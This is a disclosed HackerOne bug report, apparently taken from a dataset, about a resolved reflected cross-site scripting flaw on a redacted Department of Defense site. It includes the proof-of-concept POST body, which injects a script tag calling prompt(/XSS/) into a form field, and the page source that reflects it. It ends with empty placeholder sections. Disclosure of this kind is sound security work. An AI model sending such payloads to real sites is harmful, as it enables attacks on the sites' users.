---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '225020'
original_report_id: '225020'
title: reflected xss @ www.█████████
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2017-04-29T22:21:24.983Z'
disclosed_at: '2021-03-11T21:00:53.601Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# reflected xss @ www.█████████

## Metadata

- HackerOne Report ID: 225020
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2021-03-11T21:00:53.601Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
https://www.██████████/█████████is vulnerable to cross site scripting attacks.

**PoC**

Sending the following `POST` request to `/█████` triggers the xss:
```
%3d=%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3dTOP_OF_RECORD%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d%3d&ATprogram=1&E=&fullname=nbfgkjaa'%22()%26%25<geeknik><ScRiPt%20>prompt(/XSS/)</ScRiPt>&glomf=1&glorf=1&numusers=xmkucffw&org=1&other=1&phone=555-666-0606&recType%21=-██████-&source=1&sponsorglomf=1&sponsorname=xmkucffw&sponsorphone=555-666-0606
```

This is reflected in the page source:
```
A request has successfully been entered for nbfgkjaa'"()&%<geeknik><ScRiPt >prompt(/XSS/)</ScRiPt>.</h3><h3>A confirmation email will shortly be sent to 1.</h3>
```

**Suggested Mitigation/Remediation Actions**
This script should filter metacharacters from user input.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
